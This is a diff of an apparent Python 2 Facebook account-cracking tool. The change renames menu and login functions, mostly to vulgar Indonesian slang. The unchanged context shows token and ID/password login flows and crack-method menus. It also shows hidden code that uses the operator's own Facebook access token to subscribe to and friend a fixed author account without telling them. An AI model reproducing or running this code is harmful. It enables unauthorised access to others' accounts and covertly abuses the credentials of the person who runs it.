@@ -79,7 +79,7 @@ logo ='''\n\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m\n
 
     
 
-def yayanxyz():
+def kanjut():
     os.system('clear')
     print logo
     jalan('\x1b[1;97m[\x1b[1;92m01\x1b[1;97m] B-Api Methode')
@@ -87,9 +87,9 @@ def yayanxyz():
     jalan('\x1b[1;97m[\x1b[1;92m03\x1b[1;97m] Localhost Methode') 
     jalan('\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Logout')
     print '\x1b[1;94m────────────────────────────────────────────────────'
-    yayanxyz_select()
+    pilih_kanjut()
 
-def yayanxyz_select():
+def pilih_kanjut():
     mek = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
     if mek == '1' or mek == '01':
         yxz()
@@ -105,20 +105,20 @@ def yayanxyz_select():
         print ''
         print '\t    \x1b[1;31mSelect valid method'
         print ''
-        yayanxyz_select()
+        pilih_kanjut()
 
 
-def login():
+def memek():
     os.system('clear')
     print logo
     jalan('\x1b[1;97m[\x1b[1;93m01\x1b[1;97m] Token Login')
     jalan ('\x1b[1;97m[\x1b[1;93m02\x1b[1;97m] ID/Pass Login')
     jalan('\x1b[1;97m[\x1b[1;91m00\x1b[1;97m] Back Menu')
     print '\x1b[1;94m────────────────────────────────────────────────────'
-    login_select()
+    pilih_memek()
 
 
-def login_select():
+def pilih_memek():
     yan = raw_input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
     if yan == '1' or yan == '01':
         os.system('clear')
@@ -137,7 +137,7 @@ def login_select():
             requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token='+token)
             time.sleep(3)
             os.system('xgd-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
-            yayanxyz()
+            yxz()
         except (KeyError, IOError):
             print ''
             print '\t    \x1b[1;31mToken not valid'
@@ -148,12 +148,12 @@ def login_select():
     elif yan =='2' or yan =='02':
         login_fb()
     elif yan =='0' or yan =='00':
-    	yayanxyz()
+    	kanjut()
     else:
         print ''
         print '\t    ' + c + 'Select valid method' + c2
         print ''
-        login_select()
+        pilih_memek()
 
 
 def login_fb():
@@ -171,14 +171,14 @@ def login_fb():
     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
     q = json.loads(data)
     if 'loc' in q:
-        hamza = open('.fb_token.txt', 'w')
-        hamza.write(q['loc'])
-        hamza.close()
+        yayan = open('.fb_token.txt', 'w')
+        yayan.write(q['loc'])
+        yayan.close()
         requests.post('https://graph.facebook.com/me/friends?uid=100005395413800&access_token=' + q['loc'])
         time.sleep(1)
         print '\t    \x1b[1;32mLogged in successfully\x1b[0;97m'
         time.sleep(1)
-        yayan_ganteng()
+        yxz()
     elif 'www.facebook.com' in q['error']:
         print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
         print ''
@@ -310,7 +310,7 @@ def yxz_select():
     elif kentod == '4' or kentod == '04':
         yayan_xd()
     elif kentod == '0' or kentod == '00':
-        yayanxyz()
+        kanjut()
     else:
         print ''
         print '\t    ' + c + ' Wrong Input' + c2
@@ -768,7 +768,7 @@ def l_menu_select():
             id.append(uid + '|' + nm)
 
     elif croot == '0' or croot =='00':
-        yayanxyz()
+        kanjut()
     else:
         print ''
         print '\t    ' + c + 'Select valid method' + c2
@@ -912,4 +912,4 @@ def l_menu_select():
 
 
 if __name__ == '__main__':
-    yayanxyz()
+    kanjut()
